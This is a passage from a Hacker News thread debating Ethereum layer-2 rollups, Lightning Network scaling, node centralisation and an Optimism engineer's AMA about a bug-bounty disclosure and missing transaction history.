rollups like in the OP. This is just my understanding, somebody please correct me if I’m wrong. | | --- | --- | --- | | | |  |  | [baby](user?id=baby) [on Feb 11, 2022](item?id=30295721)   | [root](#30290157) | [parent](#30293090) | [next](#30293510) [–]  I just spent 20min to look for that debate between some of the big players: \* the optimistic side: [https://medium.com/offchainlabs/optimistic-rollups-the-prese...](https://medium.com/offchainlabs/optimistic-rollups-the-present-and-future-of-ethereum-scaling-60fb9067ae87) \* the zk side: [https://blog.polygon.technology/zk-and-the-future-of-ethereu...](https://blog.polygon.technology/zk-and-the-future-of-ethereum-scaling/) On one hand you have a complicated protocol that doesn't really use cryptography and that has the user (you) monitor the blockchain for a week to make sure their transfer was processed correctly (otherwise my understanding is that you have to create a fraud proof, send it to the chain, otherwise you will lose your funds). On the other hand you have a cryptographic proof of a few kilobyte that proves that some program correctly validated and applied the state transition of thousands of transactions. | | --- | --- | --- | | | |  |  | [Ar-Curunir](user?id=Ar-Curunir) [on Feb 11, 2022](item?id=30296423)   | [root](#30290157) | [parent](#30295721) | [next](#30293510) [–]  As a zkSNARK cryptographer, efficient cryptographic proofs are incredibly complex pieces of technology that still have a ways to go before they can match the speed of native execution. Both approaches have pros and cons. | | --- | --- | --- | | | |  |  | [baby](user?id=baby) [on Feb 11, 2022](item?id=30298496)   | [root](#30290157) | [parent](#30296423) | [next](#30293510) [–]  Good thing we’re not competing with native execution, and instead with the slow ethereum computer. | | --- | --- | --- | | | |  |  | [Ar-Curunir](user?id=Ar-Curunir) [on Feb 12, 2022](item?id=30310436)   | [root](#30290157) | [parent](#30298496) | [next](#30293510) [–]  Optimistic rollups are native execution | | --- | --- | --- | | | |  |  | [baby](user?id=baby) [on Feb 12, 2022](item?id=30314171)   | [root](#30290157) | [parent](#30310436) | [next](#30293510) [–]  that has 1 week of finality | | --- | --- | --- | | | |  |  | [jrochkind1](user?id=jrochkind1) [on Feb 10, 2022](item?id=30293510)   | [root](#30290157) | [parent](#30293090) | [prev](#30295721) | [next](#30293697) [–]  I gotta admit I don't know what 50% of the words there mean, but it surprises me to suggest that "absolute integrity" would not be required for trading, escrow, DeFi, DAO/access tokens. Makes sense for games and art (but then I wonder what they are doing using a blockchain in the first place). | | --- | --- | --- | | | |  |  | [mattdesl](user?id=mattdesl) [on Feb 11, 2022](item?id=30295256)   | [root](#30290157) | [parent](#30293510) | [next](#30293697) [–]  zk rollups tend to inherit most of the security features of L1[1] but with some trade-offs. The trade-off is basically scalability (and thus fees). If the L1 network is so highly congested that each transaction costs $100 or more in the future, a scalable zk rollup that achieves about the same level of security at the cost of < $0.001 may be worth these tradeoffs. [1] - <https://zksync.io/userdocs/security.html#security-overview> | | --- | --- | --- | | | |  |  | [sophrocyne](user?id=sophrocyne) [on Feb 10, 2022](item?id=30293697)   | [root](#30290157) | [parent](#30292531) | [prev](#30293090) | [next](#30298908) [–]  This turned out to be longer than I intended. Apologies. I view Ethereum as a value network, connecting disparate sets of transactional use cases around a set of core services (like Address, asset records, and transaction functions) To believe that blockchain makes sense for assets which do not require absolute integrity, you'd need to first accept that there are valuable use cases which having an asset management & transaction layer (L1) serves. If we establish that there are valuable use cases that attract asset management to L1, at a certain point network effects begin to take hold, and the system becomes "top of wallet". There are parallels in how you manage traditional finances today - Even if you have multiple bank accounts and digital wallets for USD (e.g., a Chase account, Cash App, Venmo, etc.) you're likely to mentally consider one of those your "primary" account. The important one. The main difference in the value network of Ethereum is that the primary account can aggregate the assets that are managed/transacted through L2 solutions. The L2 solutions leverage the core "identity/asset mgmt layer" of L1, but serve use cases that don't justify the cost of development/operation/transaction on the main layer. To connect this analogy to the original question, let's imagine that your Bank Account offered direct integration with each of the other accounts you manage - Capturing every asset you held, including the 124 gold you still have on your World of Warcraft account from a decade ago. If the 124 gold were to somehow disappear due to a bug/hack/other integrity issue, your bank account would reflect that. But the important stuff would be there. TL;DR - If commerce generally moves to blockchain systems at significant scale, there will be an acceptable level of failure on L2 systems to support the convenience of aggregating up asset mgmt alongside the important stuff. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298381)   | [root](#30290157) | [parent](#30293697) | [next](#30298908) [–]  This does a good job of answering what kinds of transactions you don't care about, but not why you want them to be on a block chain. The usecase given agregating those assets by the wallet has two problems: 1. You can have many wallets 2. Not everything associated with the wallet has to have it's transactions tracked on a block chain All you need is one more column in the wow database, and you can pull up your wow assets with your wallet without them being on the L1 or L2 chain | | --- | --- | --- | | | |  |  | [sophrocyne](user?id=sophrocyne) [on Feb 11, 2022](item?id=30300519)   | [root](#30290157) | [parent](#30298381) | [next](#30298908) [–]  I suppose that’s fair. You could theoretically argue for some “integration” between an off-chain centralized database and on-chain wallet - but unless it were just an untrusted pointer, there would need to be some asset managed from a contract to serve as a “proof” of sorts. If you’re questioning why people would prefer on-chain vs off-chain games, I wager there’s something appealing about the “decentralized” nature of the system that attracts people to on-chain games - and I put decentralized in quotes because it’s not always certain that’s a promise always delivered on, but it’s where the appeal is derived from. Regarding your other notes - 1. Same theory applies though. One wallet is often seen as a primary wallet (hot) that manages public facing assets - e.g., registered ENS domain, an NFT, etc. 2. It’s certainly not required that all associations live on chain, but if you want core services and verification of ownership, it’s mostly on/chain or bust. | | --- | --- | --- | | | |  |  | [lhl](user?id=lhl) [on Feb 11, 2022](item?id=30298908)   | [root](#30290157) | [parent](#30292495) | [prev](#30292531) | [next](#30292100) [–]  execution node (ETH 1.0) diversity is important, but actually more important moving forward is the consensus (beacon chain, fka Ethereum 2.0) diversity. The crawled data here shows that Prysm has almost 2/3s of that: <https://migalabs.es/crawler/dashboard> For a good recent/up-to-date summary of the differences, why it matters: [https://ethereum.org/ms/developers/docs/nodes-and-clients/cl...](https://ethereum.org/ms/developers/docs/nodes-and-clients/client-diversity/) And here's a good reference site as well promoting better client diversity before the merge: <https://clientdiversity.org/> | | --- | --- | --- | | | |  |  | [sophrocyne](user?id=sophrocyne) [on Feb 11, 2022](item?id=30300552)   | [root](#30290157) | [parent](#30298908) | [next](#30292100) [–]  Doing my part with lighthouse! | | --- | --- | --- | | | |  |  | [DennisP](user?id=DennisP) [on Feb 10, 2022](item?id=30292100)   | [parent](#30290157) | [prev](#30292119) | [next](#30290505) [–]  With zkrollups, you get an on-chain proof that the off-chain infrastructure did everything correctly. A contract can even verify that proof before updating the data on chain. | | --- | --- | --- | | | |  |  | [serverholic](user?id=serverholic) [on Feb 10, 2022](item?id=30290505)   | [parent](#30290157) | [prev](#30292100) | [next](#30298761) [–]  Ethereum didn't start that way, it had to build trust over time just like any other project. Eventually L2s will get there too. | | --- | --- | --- | | | |  |  | [SubiculumCode](user?id=SubiculumCode) [on Feb 10, 2022](item?id=30290776)   | [root](#30290157) | [parent](#30290505) | [next](#30298761) [–]  Same with Polygon their Ethereum L2+Sidechaining scaling solutions. Polygon is quickly building a reputation for solid secure code, mostly because their team kicks ass and is proactive. | | --- | --- | --- | | | |  |  | [jeffalbertson](user?id=jeffalbertson) [on Feb 10, 2022](item?id=30291809)   | [root](#30290157) | [parent](#30290776) | [next](#30298761) [–]  I mean they just disclosed a 1.6mil hack 40days ago. I like polygon and unfortunately feel like hacks/stolen funds are part of the maturing process for blockchain projects but im not yet ready to say they are building a reputation for solid secure code. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298529)   | [root](#30290157) | [parent](#30291809) | [next](#30298761) [–]  I think it's worth noting that that was an exploit as opposed to a hack or a scam. In this case, the code securely gave the money to people in a way the owners didn't expect | | --- | --- | --- | | | |  |  | [lhl](user?id=lhl) [on Feb 11, 2022](item?id=30298761)   | [parent](#30290157) | [prev](#30290505) | [next](#30290386) [–]  For those interested in the specific risks of various L2s as they stand, L2Beat has the best overview: <https://l2beat.com/?view=risk> While the various L2s are all pretty bleeding edge, the current state/alternative [1] is that a majority of the TVL is being bridged to alternate L1s, where the bridges are also extreme weaknesses [2]. There was the recent $320M Wormhole hack [3], the last record white-hat payout ($2M bounty on $850M at risk with the Polygon Bridge) [4][5], and $2.2B sits on Avalanche's Bridge [6] which is an EOA that is secured by literally 4 SGX machines. [7] [1] <https://defillama.com/chains> [2] [https://old.reddit.com/r/ethereum/comments/rwojtk/ama\_we\_are...](https://old.reddit.com/r/ethereum/comments/rwojtk/ama_we_are_the_efs_research_team_pt_7_07_january/hrngyk8/) [3] [https://wormholecrypto.medium.com/wormhole-incident-report-0...](https://wormholecrypto.medium.com/wormhole-incident-report-02-02-22-ad9b8f21eec6) [4] [https://medium.com/immunefi/polygon-double-spend-bug-fix-pos...](https://medium.com/immunefi/polygon-double-spend-bug-fix-postmortem-2m-bounty-5a1db09db7f1) [5] [https://gerhard-wagner.medium.com/double-spending-bug-in-pol...](https://gerhard-wagner.medium.com/double-spending-bug-in-polygons-plasma-bridge-2e0954ccadf1) [6] <https://app.uniwhales.io/avalanche/bridge-tracker> [7] [https://medium.com/avalancheavax/avalanche-bridge-secure-cro...](https://medium.com/avalancheavax/avalanche-bridge-secure-cross-chain-asset-transfers-using-intel-sgx-b04f5a4c7ad1) | | --- | --- | --- | | | |  |  | [sschueller](user?id=sschueller) [on Feb 10, 2022](item?id=30290386)   | [parent](#30290157) | [prev](#30298761) | [next](#30293129) [–]  Isn't the whole lightning network for bitcoin also L2? | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30290481)   | [root](#30290157) | [parent](#30290386) | [next](#30290479) [–]  It's L2, but you can have different types of L2s. With lightning network, you're opening and closing channels with a counterparty using on-chain transactions, so each channel can be tied back to an on-chain transaction. Before someone points out that it would require tons of on-chain transactions to onboard everyone onto it, you can batch thousands of channel open/closes into a single transaction with new protocol upgrades. | | --- | --- | --- | | | |  |  | [idiotsecant](user?id=idiotsecant) [on Feb 10, 2022](item?id=30290831)   | [root](#30290157) | [parent](#30290481) | [next](#30293106) [–]  That's not even the most fundamental issue with LN though, it's not a fully thought out system. As LN node count increases the routing complexity increases exponentially, which is the classic problem of routing issues on large graphs that literally every networked system has. The internet solves this with some degree of human intervention to tip the scales to particular routes, which is something that the LN inherently can't (and shouldn't) do. There is some amount of optimization that could take place using common graph routing algorithms like OLSR or others but those represent foundational changes to the protocol which historically LN is allergic to for whatever reason and wouldn't entirely solve the problem in any case. Simply put - it can't scale to that kind of throughput for a combination of cultural and technical reasons. | | --- | --- | --- | | | |  |  | [keymone](user?id=keymone) [on Feb 10, 2022](item?id=30291416)   | [root](#30290157) | [parent](#30290831) | [next](#30293778) [–]  Sigh. Quick, go tell UPS and DHL and others that they must file for bankruptcy because traveling salesman problem or whatever is hard to solve. This is just nonsense because, for instance, each LN hub can configure how much processing it wants to take on by focusing on most profitable subgraph. In the end, LN will be processing more and more payments and you will keep ignoring that fact and claiming that it can’t scale. This has been happening for years already. | | --- | --- | --- | | | |  |  | [suyjuris](user?id=suyjuris) [on Feb 10, 2022](item?id=30293778)   | [root](#30290157) | [parent](#30290831) | [prev](#30291416) | [next](#30290947) [–]  > the routing complexity increases exponentially, which is the classic problem of routing issues on large graphs that literally every networked system has I assume you are using “exponentially” in its informal meaning of “somewhat quickly” ? At least I am not aware of any routing issues that scale exponentially with the size of the graph. To the contrary, if you can pick the graph structure then routing is not very difficult at all. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30290947)   | [root](#30290157) | [parent](#30290831) | [prev](#30293778) | [next](#30291694) [–]  Most end-users won't be acting as payment gateways, they'll all have private channels, so they won't appear in the routing graphs. The number of routing nodes would be many magnitude smaller than total number of LN users. It's working fine for now with growing adoption (1ml.com) and I believe it'll only get better with time. | | --- | --- | --- | | | |  |  | [idiotsecant](user?id=idiotsecant) [on Feb 10, 2022](item?id=30291090)   | [root](#30290157) | [parent](#30290947) | [next](#30293332) [–]  Sure, but in order to accommodate more users you need more routing nodes. Exponential scaling is a funny thing- systems work perfectly right up until they catastrophically fail. That's why it's important to understand these kinds of problems ahead of time, which LN is determined not to do. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 10, 2022](item?id=30291747)   | [root](#30290157) | [parent](#30291090) | [next](#30291458) [–]  Look at it this way, if x = number of total users, routing nodes will grow O(log x), not O(c^x). The users can grow exponentially, the routing nodes won't because the marginal cost of processing an extra transaction from an end-user is very close to 0. | | --- | --- | --- | | | |  |  | [jimmydorry](user?id=jimmydorry) [on Feb 11, 2022](item?id=30297607)   | [root](#30290157) | [parent](#30291747) | [next](#30291458) [–]  I thought the routing node was putting up some amount of Bitcoin per channel. Each channel would therefore have a non-zero cost (and each user requires a channel). I would need to go back and refresh my understand as it's been quite a while since I read the LN whitepaper, much less kept abreast of developments in that space. | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 11, 2022](item?id=30301343)   | [root](#30290157) | [parent](#30297607) | [next](#30291458) [–]  When you fund a channel, the Bitcoin is still yours, you're not giving it away. With batched channel open/closes, it'll be super cheap to open and close channels. The only cost you'd pay is the opportunity cost if your counterparty isn't sending transactions, so you're not collecting routing fees. If that's the case, you can just close the channel if you need to fund another channel and don't have spare Bitcoin for it, but that's about it. | | --- | --- | --- | | | |  |  | [jimmydorry](user?id=jimmydorry) [on Feb 17, 2022](item?id=30367983)   | [root](#30290157) | [parent](#30301343) | [next](#30291458) [–]  You've just outlined how the marginal cost that you originaly stated was near zero, is in fact quite a lot larger than zero (you can't open channels without locking up your node's Bitcoin). Also, each channel opening costs a Bitcoin L1 transaction fee (which is a lot larger than $0.01 and can only really grow from here). | | --- | --- | --- | | | |  |  | [jksmith](user?id=jksmith) [on Feb 10, 2022](item?id=30291458)   | [root](#30290157) | [parent](#30291090) | [prev](#30291747) | [next](#30293332) [–]  >> which LN is determined not to do. What's the source of your opinion? | | --- | --- | --- | | | |  |  | [simias](user?id=simias) [on Feb 10, 2022](item?id=30293332)   | [root](#30290157) | [parent](#30290947) | [prev](#30291090) | [next](#30291694) [–]  Unless things have changed recently the big issue with LN is that it's fundamentally a centralizing force. The idea that everybody is going to open a million channels with every single counterparty (locking coins in the process) is ridiculous. Instead people would just open a couple of channels with big, centralized nodes but that's just Visa with cryptobabble on top. | | --- | --- | --- | | | |  |  | [thebean11](user?id=thebean11) [on Feb 11, 2022](item?id=30295420)   | [root](#30290157) | [parent](#30293332) | [next](#30291694) [–]  No it's not. Even if everyone had channels with the same, single central node it would have more guarantees than Visa does. The single central node could not just decide to keep everyone's money, as participants have the option to create an L1 transaction to withdraw funds if node they have a channel with misbehaves. | | --- | --- | --- | | | |  |  | [8note](user?id=8note) [on Feb 11, 2022](item?id=30298441)   | [root](#30290157) | [parent](#30295420) | [next](#30291694) [–]  > participants have the option to create an L1 transaction Theoretically they have that option, but in practice do they? Theoretically I can sue visa to get the right outcome too, which is a good guarantee | | --- | --- | --- | | | |  |  | [thebean11](user?id=thebean11) [on Feb 11, 2022](item?id=30301890)   | [root](#30290157) | [parent](#30298441) | [next](#30301350) [–]  What do you mean? Why wouldn't they have that option in practice? | | --- | --- | --- | | | |  |  | [rawtxapp](user?id=rawtxapp) [on Feb 11, 2022](item?id=30301350)   | [root](#30290157) | [parent](#30298441) | [prev](#30301890) | [next](#30291694) [–]  You can close a channel whenever you want, for whatever reason. | | --- | --- | --- | | | |  |  | [null0pointer](user?id=null0pointer) [on Feb 10, 2022](item?id=30291694)   | [root](#30290157) | [parent](#30290831) | [prev](#30290947) | [next](#30293106) [–]  The main issue with LN is even more fundamental than that. Their argument against other scaling solutions was basically "if we scale on chain the hardware requirements will be hard for regular people to keep up and decentralization will suffer". So instead they went about and created a system where only the wealthy have the capital to commit to open enough channels and route payments. LN is almost totally antithetical to crypto in that it enables the creation of the very thing crypto sought to destroy; gatekeeping payment processors. Bitcoin was co-opted by Blockstream and co. who wanted to become Visa/Mastercard-like rent seeking middlemen. Opinion part: Monero is technically superior to Bitcoin in basically every way. | | --- | --- | --- | | | |  |  | [voldacar](user?id=voldacar) [on Feb 10, 2022](item?id=30291795)   | [root](#30290157) | [parent](#30291694) | [next](#30291812) [–]  >Monero is technically superior to Bitcoin in basically every way I see how this is true from a privacy perspective, but how does monero solve the issue of the blockchain eventually becoming too large for an ordinary person to run a node on their pc? the bitcoin blockchain is already several hundred gigabytes | | --- | --- | --- | | | |  |  | [null0pointer](user?id=null0pointer) [on Feb 10, 2022](item?id=30292008)   | [root](#30290157) | [parent](#30291795) | [next](#30291812) [–]  As I said, that's just my opinion really. But Monero uses a dynamic block size. The hardware requirements will increase of course. But hardware becomes cheaper over time so the monetary cost of participation does not increase as quickly as LN where the cost of participation is capital directly. | | --- | --- | --- | | | |  |  | [kingo55](user?id=kingo55) [on Feb 10, 2022](item?id=30291812)   | [root](#30290157) | [parent](#30291694) | [prev](#30291795) | [next](#30294642) [–]  RE: Monero, I agree. One shortfall - how do we verify no one on the network has found and exploited an inflation bug? | | --- | --- | --- | | | |  |  | [null0pointer](user?id=null0pointer) [on Feb 10, 2022](item?id=30292053)   | [root](#30290157) | [parent](#30291812) | [next](#30294642) [–]  Good question, I don't have an answer for you unfortunately. I have seen people talk about this in the Monero community though so at least they're aware of the issue. | | --- | --- | --- | | | |  |  | [anonporridge](user?id=anonporridge) [on Feb 10, 2022](item?id=30294642)   | [root](#30290157) | [parent](#30291694) | [prev](#30291812) | [next](#30293106) [–]  Monero is what everyone used to think bitcoin was. Now that people are starting to realize what bitcoin actually is, and all the lies and misinformation are falling away, the world is gearing up to pounce on it and fully integrate it into society. People are rapidly realizing that it really is the internet of money. Monero will still have it's place, but only as the dark money network. I've actually become increasingly worried that Monero is at pretty significant risk of a nation state 51% mining attack, since it mines with generic CPUs. A government could rent out an AWS fleet to attack the network and if not kill it, at least add a lot of friction via this kind of DDOSing that temporarily blocks people and breaks interest, like they do with Tor services today. | | --- | --- | --- | | | |  |  | [HashBasher](user?id=HashBasher) [on Feb 10, 2022](item?id=30293106)   | [root](#30290157) | [parent](#30290481) | [prev](#30290831) | [next](#30290479) [–]  Exactly, CashApp/RobinHood/Coinbase/Kraken are all bitcoin L2. Centralized and trusted, but L2 nonetheless. | | --- | --- | --- | | | |  |  | [vmception](user?id=vmception) [on Feb 10, 2022](item?id=30290479)   | [root](#30290157) | [parent](#30290386) | [prev](#30290481) | [next](#30291105) [–]  hm okay, room for nuance, there are at about a dozen L2 technologies in deployment right now, each with multiple competitors using a specific technology. | | --- | --- | --- | | | |  |  | [stale2002](user?id=stale2002) [on Feb 10, 2022](item?id=30291105)   | [root](#30290157) | [parent](#30290386) | [prev](#30290479) | [next](#30293129) [–]  It is yes, and even though the lightning network is considered one of the more secure/safe L2 networks, even *it* has had bugs (now solved) that potentially could have caused everyone to lose all their money, if those bugs had been taken advantage of. | | --- | --- | --- | | | |  |  | [HashBasher](user?id=HashBasher) [on Feb 10, 2022](item?id=30293129)   | [parent](#30290157) | [prev](#30290386) | [next](#30290496) [–]  > extremely decentralized network Can you provide source for this claim? I thought that infura was the dominant infrastructure provider for eth and if it gets taken down, a majority of the apps goes down too. | | --- | --- | --- | | | |  |  | [iskander](user?id=iskander) [on Feb 10, 2022](item?id=30293506)   | [root](#30290157) | [parent](#30293129) | [next](#30293164) [–]  Infura is a single RPC endpoint, the underlying network it talks with has 5k-6k clients: <https://www.ethernodes.org/?synced=1> You can choose one of ~20 different free RPC endpoints: <https://ethereumnodes.com/> This doesn't include private or paid RPCs or just running your own. | | --- | --- | --- | | | |  |  | [rvz](user?id=rvz) [on Feb 11, 2022](item?id=30297139)   | [root](#30290157) | [parent](#30293506) | [next](#30293164) [–]  Well on the same site ethernodes.org, the majority of Ethereum nodes are running on AWS at 45% [0]. Due to this announcement from AWS [1], it is going to become even more centralized. So the claim of 'extremely decentralized network' is somewhat of a myth and a falsehood. [0] <https://ethernodes.org/networkType/Hosting> [1] [https://aws.amazon.com/about-aws/whats-new/2021/03/announcin...](https://aws.amazon.com/about-aws/whats-new/2021/03/announcing-general-availability-of-ethereum-on-amazon-managed-blockchain/) | | --- | --- | --- | | | |  |  | [yokem55](user?id=yokem55) [on Feb 11, 2022](item?id=30298795)   | [root](#30290157) | [parent](#30297139) | [next](#30298571) [–]  Ethernodes is known to be inaccurate [0] and is missing *a lot* of nodes because they can't index nodes that are maxed out on peers or are behind NAT and can't accept incoming connections from nodes they haven't connected to first. I know this for a fact because my own personal node (been online for over a year now) is not indexed on ethernodes, nor are 70% of the peers my node has. Only 2 out of my 15 peers are AWS IP addresses. As a general rule - its very difficult to get anything close to an authoritative census of a decentralized peer to peer protocol. [0] [https://nttr.stream/peter\_szilagyi/status/146057566700382617...](https://nttr.stream/peter_szilagyi/status/1460575667003826178) | | --- | --- | --- | | | |  |  | [mattdesl](user?id=mattdesl) [on Feb 11, 2022](item?id=30298571)   | [root](#30290157) | [parent](#30297139) | [prev](#30298795) | [next](#30293164) [–]  Correction: according to your link, only 28% of Eth nodes are running on AWS (1579 of 5632 - click "Network Types"). However, many of these are not mining nodes that secure the network (and therefore security of the blockchain), but instead are nodes run by dApp/web3 developers to handle things like indexing NFTs and the current state inside a smart contract.[1] It is easy to spin up a geth node for a task like this—and by default mining is not enabled. I haven't seen any stats on the total number of *mining* nodes and their network types. I agree that too much of the traffic is going through AWS, and I suspect all of these stats will need to be re-examined after the PoS Merge. [1] [https://www.reddit.com/r/ethereum/comments/ksdu11/how\_can\_et...](https://www.reddit.com/r/ethereum/comments/ksdu11/how_can_ethereum_give_us_decentralized_internet/gifvhem/?utm_source=reddit&utm_medium=web2x&context=3) | | --- | --- | --- | | | |  |  | [nootropicat](user?id=nootropicat) [on Feb 10, 2022](item?id=30293164)   | [root](#30290157) | [parent](#30293129) | [prev](#30293506) | [next](#30290496) [–]  Infura already went down several times and nothing happened. Metamask users can easily switch to other rpc providers (including their own nodes). | | --- | --- | --- | | | |  |  | [soco](user?id=soco) [on Feb 10, 2022](item?id=30290496)   | [parent](#30290157) | [prev](#30293129) | [next](#30293113) [–]  Correct me if I'm wrong, but with those L2 tricks the plusvalue of Ethereum gets kinda diluted... and there's already a heavy discussion on the "why should I use it at all". | | --- | --- | --- | | | |  |  | [serverholic](user?id=serverholic) [on Feb 10, 2022](item?id=30290517)   | [root](#30290157) | [parent](#30290496) | [next](#30291082) [–]  You're going to have to explain. L2 heavily rely on the Ethereum base layer. | | --- | --- | --- | | | |  |  | [suikadayo](user?id=suikadayo) [on Feb 10, 2022](item?id=30291082)   | [root](#30290157) | [parent](#30290496) | [prev](#30290517) | [next](#30292756) [–]  Most L2s will require users to pay transaction fees in ETH. Some will have fee abstraction where people can pay with tokens, but the rollup themselves will still end up paying ETH on L1. Ethereum will essentially be a settlement layer for rollups, and everyone will be doing their DeFi, NFTs, etc on the rollups which are almost treated like their own chains. | | --- | --- | --- | | | |  |  | [k\_\_](user?id=k__) [on Feb 10, 2022](item?id=30292756)   | [root](#30290157) | [parent](#30290496) | [prev](#30291082) | [next](#30293113) [–]  Their proof ends up on L1 and they get cheaper the more people use them. | | --- | --- | --- | | | |  |  | [lihorne](user?id=lihorne) [on Feb 10, 2022](item?id=30293113)   | [prev](#30290157) | [next](#30290686) [–]  Hey! Optimism's head of engineering here! We're super greatful to saurik for writing up such a great analysis of what he found. If you want to hear some of our key takeaways as the maintainers of the network, you can check out our disclosure post here [1]. If you're wondering WTF Optimism is... we are building an optimistic rollup on top of ethereum. The basic idea is to de-couple blockchain computation from data availability and allow a new operator to exist called a sequencer which can accept transaction requests and submit the calldata to Ethereum Mainnet, but do the computation on Optimism Mainnet. There is an idea of a fault proof which means you can verify that the computation done on Optimism Mainnet followed the exact rules of the EVM, and you can prove this on Ethereum Mainnet. Our fault proof codebase, cannon, was built by another jailbreak legend (geohot) precisely with the goal of running Ethereum's battle-tested code and minimize the chances of bugs like this. It's some really cool stuff. If you're into compilers, VMs, and blockchains alike, check it out! [2] The protocol is still in active development, it is not done yet, and that's exactly why we set up this bug bounty program. We think bug bounties matter, a lot, and we're proud to now become the record holders of the largest bug bounty payout in history, however we hope to very quickly be beaten by someone else. Developers like saurik, who we've gotten to know recently, are super important for this ecosystem to thrive. Building this stuff is hard, and we want the best hackers in the world to get rich breaking these protocols because if we succeed in this industry, this technology will be the backbone of the world's financial infrastructure — it needs to be secure. Everything we write is also MIT licensed and developed completely in the open. Very happy to answer any questions, I'll check this thread for the rest of the day — AMA :) Also, we are hiring! [3] [1] [https://optimismpbc.medium.com/disclosure-fixing-a-critical-...](https://optimismpbc.medium.com/disclosure-fixing-a-critical-bug-in-optimisms-geth-fork-a836ebdf7c94) [2] <https://github.com/ethereum-optimism/cannon/> [3] <https://boards.greenhouse.io/optimism> | | --- | --- | --- | | | |  |  | [cheese\_it](user?id=cheese_it) [on Feb 10, 2022](item?id=30293667)   | [parent](#30293113) | [next](#30293526) [–]  Hello, I've been wondering what the hardware requirements for running Optimism's infrastructure are relative to just running a Mainnet node. If Optimism can process more transactions than the main chain, does that mean state growth is also much higher? How is Optimism thinking about this problem as it moves to decentralize the sequencer in the future? | | --- | --- | --- | | | |  |  | [lihorne](user?id=lihorne) [on Feb 10, 2022](item?id=30293961)   | [root](#30293113) | [parent](#30293667) | [next](#30293526) [–]  This is a fantastic question for pretty much every scaling solution out there — as the initial engineering work on rollups finish, many of the fundamental scaling problems re-emerge on L2. Right now, our system's hardware requirements are very similar to L1 mainnet, but the state is growing. There are two solutions in the future: statelessness, and block-producer/verifier asymmetry. Statelessness (and related concepts like state expiry) has been under active research in Ethereum for years, and we've recently started our own contributions with a new stateless Ethereum client [1] The other part of the solution is to leverage asymmetries between the hardware requirements of block producers and verifiers. TLDR: this lets you have high HW requirements for sequencers, but still secure the network with laptops. Vitalik recently wrote about this; you can read that here [2] [1] [https://twitter.com/ben\_chain/status/1488275978983915523?s=2...](https://twitter.com/ben_chain/status/1488275978983915523?s=20&t=OPIaND_5dtAm2DvWbe0x7g) [2] <https://vitalik.ca/general/2021/12/06/endgame.html> | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [on Feb 10, 2022](item?id=30293526)   | [parent](#30293113) | [prev](#30293667) | [next](#30293317) [–]  I have a question: why did you make transaction data from before the Nov 11 upgrade unavailable? How hard would this have been? It's just serving the same immutable transactions that were there before, right? People were expecting these to be available for planning and tax reporting. Even finding out about them after the fact was difficult because the cause of missing transactions wasn't made public on the user-facing site. For months the maintainers fielded questions from people on the discord that could have been satisfied by an announcement on the website. And even the announcements on discord came slowly. | | --- | --- | --- | | | |  |  | [lihorne](user?id=lihorne) [on Feb 10, 2022](item?id=30293807)   | [root](#30293113) | [parent](#30293526) | [next](#30293317) [–]  The Nov 11 upgrade radically changed how Optimism's backend worked. Transactions after 11/11 are executed in a VM that's much closer to the EVM than before. It's still possible to run nodes that access these pre-11/11 transactions, but because of the way Etherscan and geth are designed, it's unfortunately not as simple as just serving the same data again. Etherscan CSV exports are the best solution we had that didn't require significant modifications to Etherscan's backend. You should be able to use the CSV feature to export all of your relevant pre-11/11 transaction data (transactions and ERC20/ERC721 transfers). While we did our best to communicate this months in advance on our twitter, blog, discord, and documentation, it's hard to reach everyone and we totally agree that this is not ideal. At the time, we had to prioritize progress, but we've since made a firm commitment to not to update the chain in this way going forward. So, this shouldn't be something people will need to worry about in the future. | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [on Feb 10, 2022](item?id=30294065)   | [root](#30293113) | [parent](#30293807) | [next](#30293317) [–]  >While we did our best to communicate this months in advance on our twitter, blog, discord, and documentation, it's hard to reach everyone and we totally agree that this is not ideal That doesn't look like your best. Here's the blog you refer to[1]: <https://optimismpbc.medium.com/> Imagine I came to it around the time of the switchover. Which of those headlines looks like it's alerting me that my transaction history will be gone? Here's the Optimistic ethereum site: <https://www.optimism.io/> Where is/was the blaring warning about missing transaction data? Here's the Twitter page[1]: <https://twitter.com/optimismPBC> The only pinned tweet is a cute meme about the whitelist change, nothing to head off frustrated users wondering where transaction history went. (I don't know how to link a historical post in context but I can assure it was not evident on the Twitter feed why I was missing transaction history, and there are no such warnings before.) The only reason I even got on the Optimism Discord is because none of these places had any information! And then, even when I went to the Discord, and go to #announcements, and look at what was being announced in the runup and release, the loss of transactions still isn't mentioned! [2] Maintainers talk about the upgrade, to be sure, but *not this implication of it*. So no, I don't know how can justify the claim that you made a serious effort to alert users. [1] Linked from the community tab of <https://www.optimism.io/> [2] [https://discord.com/channels/667044843901681675/754090866435...](https://discord.com/channels/667044843901681675/754090866435424270/903370720111910943) | | --- | --- | --- | | | |  |  | [lihorne](user?id=lihorne) [on Feb 10, 2022](item?id=30294426)   | [root](#30293113) | [parent](#30294065) | [next](#30293317) [–]  You're right that we could have been better communicators about this. We prioritized our concerns with applications that could break during the upgrade, and we biased our public communications towards developers as a result. For example, you're right that a notification on our homepage, in addition to our docs, would have been a good reminder to users. We'll work on getting a blog post and better documentation up that explains exactly how to access data from before 11/11. We really appreciate the candid feedback here. We're a very fast growing startup tackling a herculean task, so we're bound to make mistakes and this is one of them — I hope you can understand. We want to be much better communicators going forward. | | --- | --- | --- | | | |  |  | [SilasX](user?id=SilasX) [on Feb 11, 2022](item?id=30294994)   | [root](#30293113) | [parent](#30294426) | [next](#30293317) [–]  >For example, you're right that a notification on our homepage, in addition to our docs I don't remember it being in the docs either, as that would have also saved me from signing up on the Discord. And this isn't an issue of prioritization. Remember, your overworked volunteers and maintainers on the Discord are *still* spending hours every day fielding questions in #user-support that could have been answered by a link in prominent places. You're wasting more person-hours than you would have with effective communication and trivial updates in prominent places. You didn't even benefit your own goals by leaving those out! So no, I guess I don't understand what the huge barrier is to putting out these important notices. | | --- | --- | --- | | | |  |  | [openfuture](user?id=openfuture) [on Feb 11, 2022](item?id=30298002)   | [root](#30293113) | [parent](#30294994) | 